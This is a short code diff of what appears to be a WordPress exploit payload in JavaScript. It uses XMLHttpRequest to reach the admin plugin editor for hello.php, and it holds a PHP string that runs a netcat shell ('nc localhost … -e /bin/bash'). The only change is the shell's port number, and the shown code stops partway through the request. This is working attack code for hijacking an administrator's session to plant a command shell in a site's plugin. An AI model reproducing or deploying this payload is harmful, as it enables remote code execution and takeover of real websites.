@@ -1,6 +1,6 @@
 p = '/wp-admin/plugin-editor.php?';
 q = 'file=hello.php';
-s = '<?=`nc localhost 5855 -e /bin/bash`;';
+s = '<?=`nc localhost 4848 -e /bin/bash`;';
 
 a = new XMLHttpRequest();
 a.open('GET', p+q, 0);
